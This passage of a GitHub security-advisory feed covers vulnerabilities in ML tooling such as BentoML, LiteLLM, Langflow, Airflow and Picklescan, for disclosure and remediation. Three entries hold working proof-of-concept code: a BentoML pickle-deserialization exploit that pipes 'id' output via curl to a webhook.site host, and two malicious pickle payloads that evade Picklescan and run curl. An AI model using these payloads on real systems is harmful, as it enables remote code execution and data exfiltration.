            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There was an insecure deserialization in BentoML's runner server. By setting specific headers and parameters in the POST request, it is possible to execute any unauthorized arbitrary code on the server, which will grant the attackers to have the initial access and information disclosure on the server.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>First, create a file named <strong>model.py</strong> to create a simple model and save it</li>\n</ul>\n<pre><code>import bentoml\nimport numpy as np\n\nclass mymodel:\n    def predict(self, info):\n        return np.abs(info)\n    def __call__(self, info):\n        return self.predict(info)\n\nmodel = mymodel()\nbentoml.picklable_model.save_model(\"mymodel\", model)\n</code></pre>\n<ul>\n<li>Then run the following command to save this model</li>\n</ul>\n<pre><code>python3 model.py\n</code></pre>\n<ul>\n<li>Next, create <strong>bentofile.yaml</strong> to build this model</li>\n</ul>\n<pre><code>service: \"service.py\"  \ndescription: \"A model serving service with BentoML\"  \npython:\n  packages:\n    - bentoml\n    - numpy\nmodels:\n  - tag: MyModel:latest  \ninclude:\n  - \"*.py\"  \n</code></pre>\n<ul>\n<li>Then, create <strong>service.py</strong> to host this model</li>\n</ul>\n<pre><code>import bentoml\nfrom bentoml.io import NumpyNdarray\nimport numpy as np\n\n\nmodel_runner = bentoml.picklable_model.get(\"mymodel:latest\").to_runner()\n\nsvc = bentoml.Service(\"myservice\", runners=[model_runner])\n\nasync def predict(input_data: np.ndarray):\n\n    input_columns = np.split(input_data, input_data.shape[1], axis=1)\n    result_generator = model_runner.async_run(input_columns, is_stream=True)\n    async for result in result_generator:\n        yield result\n</code></pre>\n<ul>\n<li>Then, run the following commands to build and host this model</li>\n</ul>\n<pre><code>bentoml build\nbentoml start-runner-server --runner-name mymodel --working-dir . --host 0.0.0.0 --port 8888\n</code></pre>\n<ul>\n<li>Finally, run this below python script to exploit insecure deserialization vulnerability in BentoML's runner server.</li>\n</ul>\n<pre><code>import requests\nimport pickle\n\nurl = \"http://0.0.0.0:8888/\"\n\nheaders = {\n    \"args-number\": \"1\",\n    \"Content-Type\": \"application/vnd.bentoml.pickled\",\n    \"Payload-Container\": \"NdarrayContainer\", \n    \"Payload-Meta\": '{\"format\": \"default\"}',\n    \"Batch-Size\": \"-1\",\n}\n\nclass P:\n    def __reduce__(self):\n        return  (__import__('os').system, ('curl -X POST -d \"$(id)\" https://webhook.site/61093bfe-a006-4e9e-93e4-e201eabbb2c3',))\n\nresponse = requests.post(url, headers=headers, data=pickle.dumps(P()))\n\nprint(response)\n</code></pre>\n<p>And I can replace the <strong>NdarrayContainer</strong> with <strong>PandasDataFrameContainer</strong> in <strong>Payload-Container</strong> header and the exploit still working.\nAfter running <strong>exploit.py</strong> then the output of the command <strong>id</strong> will be send out to the WebHook server.</p>\n<h3 id=\"root-cause-analysis\">Root Cause Analysis:</h3>\n<ul>\n<li>When handling a request in BentoML runner server in <code>src/bentoml/_internal/server/runner_app.py</code>, when the request header <code>args-number</code> is equal to 1, it will call the function <code>_deserialize_single_param</code> like the code below:</li>\n</ul>\n<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L291-L298\nasync def _request_handler(request: Request) -&gt; Response:\n    assert self._is_ready\n\n    arg_num = int(request.headers[\"args-number\"])\n    r_: bytes = await request.body()\n\n    if arg_num == 1:\n        params: Params[t.Any] = _deserialize_single_param(request, r_)\n</code></pre>\n<ul>\n<li>Then this is the function of <code>_deserialize_single_param</code>, which will take the value of all request headers of <code>Payload-Container</code>, <code>Payload-Meta</code> and <code>Batch-Size</code> and the crafted into <code>Payload</code> class which will contain the data from <code>request.body</code></li>\n</ul>\n<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L376-L393\ndef _deserialize_single_param(request: Request, bs: bytes) -&gt; Params[t.Any]:\n    container = request.headers[\"Payload-Container\"]\n    meta = json.loads(request.headers[\"Payload-Meta\"])\n    batch_size = int(request.headers[\"Batch-Size\"])\n    kwarg_name = request.headers.get(\"Kwarg-Name\")\n    payload = Payload(\n        data=bs,\n        meta=meta,\n        batch_size=batch_size,\n        container=container,\n    )\n    if kwarg_name:\n        d = {kwarg_name: payload}\n        params: Params[t.Any] = Params(**d)\n    else:\n        params: Params[t.Any] = Params(payload)\n\n    return params\n</code></pre>\n<ul>\n<li>After crafting <code>Params</code> containing payload, it will call to function <code>infer</code> with <code>params</code> variable as input</li>\n</ul>\n<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L303-L304\ntry:\n  payload = await infer(params)\n</code></pre>\n<ul>\n<li>Inside function <code>infer</code>, the <code>params</code> variable with is belong to class <code>Params</code> will call the function <code>map</code> of that class with <code>AutoContainer.from_payload</code> as a parameter.</li>\n</ul>\n<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L278-L289\nasync def infer(params: Params[t.Any]) -&gt; Payload:\n      params = params.map(AutoContainer.from_payload)\n\n      try:\n          ret = await runner_method.async_run(\n              *params.args, **params.kwargs\n          )\n      except Exception:\n          traceback.print_exc()\n          raise\n\n      return AutoContainer.to_payload(ret, 0)\n</code></pre>\n<ul>\n<li>Inside class <code>Params</code> define the function <code>map</code> which will call the <code>AutoContainer.from_payload</code> function with arguments, which are <code>data</code>, <code>meta</code>, <code>batch_size</code> and <code>container</code></li>\n</ul>\n<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/utils.py#L59-L66\ndef map(self, function: t.Callable[[T], To]) -&gt; Params[To]:\n    \"\"\"\n    Apply a function to all the values in the Params and return a Params of the\n    return values.\n    \"\"\"\n    args = tuple(function(a) for a in self.args)\n    kwargs = {k: function(v) for k, v in self.kwargs.items()}\n    return Params[To](*args, **kwargs)\n</code></pre>\n<ul>\n<li>Inside class <code>AutoContainer</code> class have defined the function <code>from_payload</code> which will find the class by the <code>payload.container</code> , which is the value of header <code>Payload-Container</code>, and it will call the function <code>from_payload</code> from the chosen class as return value</li>\n</ul>\n<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L710-L712\ndef from_payload(cls, payload: Payload) -&gt; t.Any:\n    container_cls = DataContainerRegistry.find_by_name(payload.container)\n    return container_cls.from_payload(payload)\n</code></pre>\n<p>And if the attacker set value of header <code>Payload-Container</code> to <code>NdarrayContainer</code> or <code>PandasDataFrameContainer</code>, it will call <code>from_payload</code> and when it then check if the <code>payload.meta[\"format\"] == \"default\"</code> it will call <code>pickle.loads(payload.data)</code> and <code>payload.meta[\"format\"]</code> is the value of header <code>Payload-Meta</code> and the attacker can set it to <code>{\"format\": \"default\"}</code> and <code>payload.data</code> is the value of <code>request.body</code> which is the payload from malicious <code>class P</code> in my request, which will trigger <code>__reduce__</code> method and then execute arbitrary commands (for my example is the <code>curl</code> command)</p>\n<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L411-L416\ndef from_payload(\n    cls,\n    payload: Payload,\n) -&gt; ext.PdDataFrame:\n    if payload.meta[\"format\"] == \"default\":\n        return pickle.loads(payload.data)\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L306-L312\ndef from_payload(\n    cls,\n    payload: Payload,\n) -&gt; ext.NpNDArray:\n    format = payload.meta.get(\"format\", \"default\")\n    if format == \"default\":\n        return pickle.loads(payload.data)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>In the above Proof of Concept, I have shown how the attacker can execute command <strong>id</strong> and send the output of the command to the outside. By replacing <strong>id</strong> command with any OS commands, this insecure deserialization in BentoML's runner server will grant the attacker the permission to gain the remote shell on the server and injecting backdoors to persist access.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bentoml/BentoML/security/advisories/GHSA-7v4r-c989-xh26\">https://github.com/bentoml/BentoML/security/advisories/GHSA-7v4r-c989-xh26</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32375\">https://nvd.nist.gov/vuln/detail/CVE-2025-32375</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7v4r-c989-xh26\">https://github.com/advisories/GHSA-7v4r-c989-xh26</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7v4r-c989-xh26",
            "title": "[bentoml] BentoML's runner server Vulnerable to Remote Code Execution (RCE) via Insecure Deserialization",
            "date_modified": "2025-04-09T20:14:21.000Z",
            "date_published": "2025-04-09T12:59:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7v4r-c989-xh26"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Denial of Service (DoS) vulnerability exists in berriai/litellm version v1.44.5. This vulnerability can be exploited by appending characters, such as dashes (-), to the end of a multipart boundary in an HTTP request. The server continuously processes each character, leading to excessive resource consumption and rendering the service unavailable. The issue is unauthenticated and does not require any user interaction, impacting all users of the service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8984\">https://nvd.nist.gov/vuln/detail/CVE-2024-8984</a></li>\n<li><a href=\"https://huntr.com/bounties/554fc76b-3097-4223-b4cf-110b853e9355\">https://huntr.com/bounties/554fc76b-3097-4223-b4cf-110b853e9355</a></li>\n<li><a href=\"https://github.com/BerriAI/litellm/blob/8c5ff150f6142608ffe968e4e68429f978fda187/litellm/tests/test_spend_logs.py#L242\">https://github.com/BerriAI/litellm/blob/8c5ff150f6142608ffe968e4e68429f978fda187/litellm/tests/test_spend_logs.py#L242</a></li>\n<li><a href=\"https://github.com/BerriAI/litellm/commit/4f49f836aa844ac9b6bfbeff27e6f6b2b9cf3f61\">https://github.com/BerriAI/litellm/commit/4f49f836aa844ac9b6bfbeff27e6f6b2b9cf3f61</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fh2c-86xm-pm2x\">https://github.com/advisories/GHSA-fh2c-86xm-pm2x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fh2c-86xm-pm2x",
            "title": "[litellm] LiteLLM Vulnerable to Denial of Service (DoS) via Crafted HTTP Request",
            "date_modified": "2025-04-08T14:39:52.000Z",
            "date_published": "2025-03-20T12:32:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fh2c-86xm-pm2x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Langflow versions prior to 1.3.0 are susceptible to code injection in the <code>/api/v1/validate/code</code> endpoint. A remote and unauthenticated attacker can send crafted HTTP requests to execute arbitrary code.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3248\">https://nvd.nist.gov/vuln/detail/CVE-2025-3248</a></li>\n<li><a href=\"https://github.com/langflow-ai/langflow/pull/6911\">https://github.com/langflow-ai/langflow/pull/6911</a></li>\n<li><a href=\"https://github.com/langflow-ai/langflow/releases/tag/1.3.0\">https://github.com/langflow-ai/langflow/releases/tag/1.3.0</a></li>\n<li><a href=\"https://www.horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai\">https://www.horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c995-4fw3-j39m\">https://github.com/advisories/GHSA-c995-4fw3-j39m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c995-4fw3-j39m",
            "title": "[langflow] Langflow Vulnerable to Code Injection via the `/api/v1/validate/code` endpoint",
            "date_modified": "2025-04-10T01:59:49.000Z",
            "date_published": "2025-04-07T15:31:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c995-4fw3-j39m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Apache Airflow Common SQL Provider.</p>\n<p>When using the partition clause in SQLTableCheckOperator as parameter (which was a recommended pattern), Authenticated UI User could inject arbitrary SQL command when triggering DAG exposing partition_clause to the user.\nThis allowed the DAG Triggering user to escalate privileges to execute those arbitrary commands which they normally would not have.</p>\n<p>This issue affects Apache Airflow Common SQL Provider: before 1.24.1.</p>\n<p>Users are recommended to upgrade to version 1.24.1, which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30473\">https://nvd.nist.gov/vuln/detail/CVE-2025-30473</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/48098\">https://github.com/apache/airflow/pull/48098</a></li>\n<li><a href=\"https://lists.apache.org/thread/53klkv790cylqcop0350w7nfq1y6h0t2\">https://lists.apache.org/thread/53klkv790cylqcop0350w7nfq1y6h0t2</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/04/04/2\">http://www.openwall.com/lists/oss-security/2025/04/04/2</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/04/06/1\">http://www.openwall.com/lists/oss-security/2025/04/06/1</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/04/06/2\">http://www.openwall.com/lists/oss-security/2025/04/06/2</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/04/06/3\">http://www.openwall.com/lists/oss-security/2025/04/06/3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5r62-mjf5-xwhj\">https://github.com/advisories/GHSA-5r62-mjf5-xwhj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5r62-mjf5-xwhj",
            "title": "[apache-airflow-providers-common-sql] Apache Airflow Common SQL Provider Vulnerable to SQL Injection",
            "date_modified": "2025-04-07T20:38:27.000Z",
            "date_published": "2025-04-07T09:30:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5r62-mjf5-xwhj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Using timeit.timeit() function, which is a built-in python library function to execute remote pickle file.</p>\n<h3 id=\"details\">Details</h3>\n<p>Pickle’s deserialization process is known to allow execution of function via reduce method. While Picklescan is meant to detect such exploits, this attack evades detection by calling built-in python library function like <strong>timeit.timeit()</strong>. And since timeit library wasn't inside unsafe globals blacklist, it may not raise red flag in the security scan.</p>\n<p>The attack payload executes in the following steps:</p>\n<p>First, the attacker craft the payload by calling to <strong>timeit.timeit()</strong> function from timeit library in <strong>reduce</strong> method\nThen, inside reduce method, the attacker import dangerous libarary like os and calling <strong>os.system()</strong> to run OS commands, for example: curl command. And then the attacker send this malicious pickle file to the victim.\nThen when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>The attacker crafted a malicious pickle file using built-in python library function timeit.timeit()</li>\n</ol>\n<pre><code>import pickle\nimport timeit\nclass Payload(object):\n    def __reduce__(self):\n        return timeit.timeit, ('','import os; os.system(\"curl https://webhook.site/95f3e1c3-ee37-4a5a-8544-ab4ce93475f6\")')\ndef create_payload():\n  with open('payload.pickle', 'wb') as f:\n    pickle.dump(Payload(), f)\ncreate_payload()\n</code></pre>\n<p>Then the attacker will send this pickle file to the victim computer and maybe the victim load this pickle using pickle.load()\n2. The victim will use picklescan library to check out if the received pickle file is malicious or not</p>\n<pre><code>picklescan -p payload.pickle\n----------- SCAN SUMMARY -----------\nScanned files: 1\nInfected files: 0\nDangerous globals: 0\n</code></pre>\n<ol start=\"3\">\n<li>Beliving that this pickle file is safe using modelscan, the victim then load this pickle file which will trigger timeit.timeit command to execute OS commands (in my example, it was curl command)</li>\n</ol>\n<pre><code>import pickle\ndef load_payload():\n    with open('payload.pickle', 'rb') as f:\n      pickle.load(f)\nload_payload()\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Severity: High</p>\n<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.</p>\n<h3 id=\"recommended-solution\">Recommended Solution</h3>\n<p>I suggest adding timeit library to the unsafe globals blacklist.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-v7x6-rv5q-mhwc\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-v7x6-rv5q-mhwc</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/pull/40\">https://github.com/mmaitre314/picklescan/pull/40</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/releases/tag/v0.0.25\">https://github.com/mmaitre314/picklescan/releases/tag/v0.0.25</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v7x6-rv5q-mhwc\">https://github.com/advisories/GHSA-v7x6-rv5q-mhwc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v7x6-rv5q-mhwc",
            "title": "[picklescan] Picklescan missing detection when calling built-in python library function timeit.timeit()",
            "date_modified": "2025-04-07T19:37:26.000Z",
            "date_published": "2025-04-07T19:37:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v7x6-rv5q-mhwc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An unsafe deserialization vulnerability in Python’s pickle module allows an attacker to bypass static analysis tools like Picklescan and execute arbitrary code during deserialization. This can be exploited by import some built-in function in Numpy library that indrectly call some dangerous function like exec() to execute some python code as a parameter, which the attacker can import dangerous library inside like os library and execute arbitrary OS commands.</p>\n<h3 id=\"details\">Details</h3>\n<p>Pickle’s deserialization process is known to allow execution of function via <strong>reduce</strong> method. While Picklescan is meant to detect such exploits, this attack evades detection by calling function in Numpy library that call dangerous function like exec(). And since Numpy library wasn't inside unsafe globals blacklist, it may not raise red flag in the security scan.</p>\n<p>The attack payload executes in the following steps:</p>\n<ul>\n<li>First, the attacker craft the payload by import <strong>runstring</strong> function in <strong>numpy.testing._private.utils</strong></li>\n<li>Then, inside <strong>reduce</strong> method, the attacker import dangerous libarary like os and calling os.system() to run OS commands, for example: curl command. And then the attacker send this malicious pickle file to the victim.</li>\n<li>Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>import pickle\nimport torch\nimport pickle\nfrom picklescan.scanner import scan_file_path\nclass Payload:\n  def __reduce__(self):\n    from numpy.testing._private.utils import runstring\n    return runstring, (\"import os; os.system('curl https://example.com')\",{})\n    \ndef create_payload():\n  with open('payload.pickle', 'wb') as f:\n    pickle.dump(Payload(), f)\n\ndef load_payload():\n  result = scan_file_path('payload.pickle')\n  if result.infected_files != 0 or result.scan_err:\n    print('File is infected')\n  else:\n    print('File is clean')\n    with open('payload.pickle', 'rb') as f:\n      pickle.load(f)\n\ncreate_payload() \nload_payload()\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Severity: High</p>\n<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models. For example, Invoke-AI repository (<a href=\"https://github.com/invoke-ai/InvokeAI\">https://github.com/invoke-ai/InvokeAI</a>)\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.</p>\n<h3 id=\"recommended-fixes\">Recommended Fixes:</h3>\n<p>I suggest adding Numpy library to the unsafe globals blacklist.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-fj43-3qmq-673f\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-fj43-3qmq-673f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fj43-3qmq-673f\">https://github.com/advisories/GHSA-fj43-3qmq-673f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fj43-3qmq-673f",
            "title": "[picklescan] Picklescan failed to detect to some unsafe global function in Numpy library",
            "date_modified": "2025-04-07T18:54:05.000Z",
            "date_published": "2025-04-07T18:54:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fj43-3qmq-673f"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}